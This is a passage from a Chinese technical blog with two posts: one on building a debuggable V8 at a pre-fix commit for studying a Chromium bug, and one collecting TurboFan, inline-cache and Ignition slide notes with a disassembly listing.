            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这个是因为之前一直没有一个特别好的v8调试环境搭建的方法。<br>最主要的原因就是墙,然后花了一晚上摸索了一个感觉还行的解决方案吧。。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><a href="https://cloud.google.com/" target="_blank" rel="noopener">谷歌云</a>的centos 7 x64<br>地区选台湾，4核机器就行。<br>其他国外云主机应该也行。。不过谷歌云用完了删除实例就好，很方便。</p>
<h2 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">中途中断了就gclient sync</span><br></pre></td></tr></table></figure>
<h2 id="切换到有漏洞的分支"><a href="#切换到有漏洞的分支" class="headerlink" title="切换到有漏洞的分支"></a>切换到有漏洞的分支</h2><p>举例来说</p>
<ul>
<li>bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a></li>
<li><p>fix commit<br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p>
</li>
<li><p>找到hash和test代码<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-201821.png" alt=""></p>
</li>
<li>切换<br><code>cd ~/v8/v8</code><br><code>git reset --hard a7a350012c05f644f3f373fb48d7ac72f7f60542</code></li>
<li><p>同步并编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试<br>用test里的代码测试一下效果，省略。</p>
</li>
</ul>
<h2 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h2><p>打包编译好的v8目录，<code>tar -czvf v8.tar v8</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install vsftpd -y</span><br><span class="line">sudo service vsftpd start</span><br><span class="line">sudo netstat -nltp | grep 21</span><br></pre></td></tr></table></figure></p>
<p>此时，访问 ftp://<ip 地址=""> 可浏览机器上的/var/ftp目录了。<br>把源码cp到这个目录下，直接下载即可了。</ip></p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>然后删除原来的，对tar进行解包，得到我们要调试的v8<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-203426.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-203519.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-203545.jpg" alt=""></p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p><code>tools/dev/gm.py x64.debug d8</code><br>参考<a href="https://v8.dev/docs/build-gn" target="_blank" rel="noopener">https://v8.dev/docs/build-gn</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/06/18/v8_ppt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/18/v8_ppt/" itemprop="url">v8 slide collection</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-18T02:54:45+08:00">
                2018-06-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="The-TurboFan-architecture-entry-points"><a href="#The-TurboFan-architecture-entry-points" class="headerlink" title="The TurboFan architecture / entry points"></a>The TurboFan architecture / entry points</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-135445.png" alt=""></p>
<h2 id="TurboFan-pipeline-high-level"><a href="#TurboFan-pipeline-high-level" class="headerlink" title="TurboFan pipeline (high-level)"></a>TurboFan pipeline (high-level)</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-135820.png" alt=""></p>
<h2 id="Code-generation-example"><a href="#Code-generation-example" class="headerlink" title="Code generation example"></a>Code generation example</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-135911.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-141841.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-142111.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-142522.png" alt=""></p>
<h2 id="Turbofan-IR"><a href="#Turbofan-IR" class="headerlink" title="Turbofan IR"></a>Turbofan IR</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><ul>
<li>Graph based IR<ul>
<li>Nodes for operations.</li>
<li>Edges for value flow, control flow and dependencies.</li>
<li>No distinction between basic blocks and statements.</li>
<li>Single-static assignment.</li>
</ul>
</li>
<li>High/middle/low-level IR layering.</li>
<li>Side effects modelled as edges.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143530.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143638.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143823.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143847.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143923.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-144159.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-144341.png" alt=""></li>
</ul>
<h3 id="节点分层"><a href="#节点分层" class="headerlink" title="节点分层"></a>节点分层</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-145153.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-145249.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-145907.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150532.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150444.png" alt=""></p>
<h3 id="IR分层和phases"><a href="#IR分层和phases" class="headerlink" title="IR分层和phases"></a>IR分层和phases</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150639.png" alt=""></p>
<h4 id="lowering-amp-amp-Typed-Lowering"><a href="#lowering-amp-amp-Typed-Lowering" class="headerlink" title="lowering&amp;&amp;Typed Lowering"></a>lowering&amp;&amp;Typed Lowering</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150811.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150917.png" alt=""></p>
<h4 id="Representation-selection"><a href="#Representation-selection" class="headerlink" title="Representation selection"></a>Representation selection</h4><p>Representation selection now chooses machine representation and inserts conversions.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-151052.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-151159.png" alt=""></p>
<h4 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-151948.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152002.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152013.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152023.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152032.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152108.png" alt=""></p>
<h2 id="High-performance-JavaScript-with-V8"><a href="#High-performance-JavaScript-with-V8" class="headerlink" title="High performance JavaScript with V8"></a>High performance JavaScript with V8</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-185932.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-190018.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-190158.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject(x) &#123;</span><br><span class="line">  this.X = x;</span><br><span class="line">&#125;</span><br><span class="line">function getX(obj) &#123;</span><br><span class="line">  return obj.X;</span><br><span class="line">&#125;</span><br><span class="line">var o = new MyObject(3);</span><br><span class="line">print(getX(o));</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 test.js </span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-190248.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191002.png" alt=""></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191809.png" alt=""></p>
<p>用作参考：<a href="https://www.cnblogs.com/yumianhu/p/3707427.html" target="_blank" rel="noopener">https://www.cnblogs.com/yumianhu/p/3707427.html</a><br>关于IC的Cahce State,不过内容略过时。</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192442.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192512.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192553.png" alt=""><br>Crankshaft已经废弃，这里只是看下type feedback和check<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-193124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-193112.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-193028.png" alt=""></p>
<h2 id="理解v8-bytecode"><a href="#理解v8-bytecode" class="headerlink" title="理解v8 bytecode"></a>理解v8 bytecode</h2><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a><br>有中文翻译，读起来很快（逃<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-200254.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-203313.png" alt=""><br><a href="https://2017.jsconf.eu/speakers/" target="_blank" rel="noopener">https://2017.jsconf.eu/speakers/</a><br><a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags" target="_blank" rel="noopener">https://www.chromium.org/developers/how-tos/run-chromium-with-flags</a></p>
<h2 id="Parsing-JavaScript-better-lazy-than-eager"><a href="#Parsing-JavaScript-better-lazy-than-eager" class="headerlink" title="Parsing JavaScript-better lazy than eager?"></a>Parsing JavaScript-better lazy than eager?</h2><p><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></p>
<h2 id="Ignition-an-interpreter-for-v8"><a href="#Ignition-an-interpreter-for-v8" class="headerlink" title="Ignition - an interpreter for v8"></a>Ignition - an interpreter for v8</h2><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul>
<li>加法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-150922.png" alt=""></li>
<li>访问对象<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-152050.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-23-184859.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-23-184941.png" alt=""></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">sakura</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">96</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">44</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sakura</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
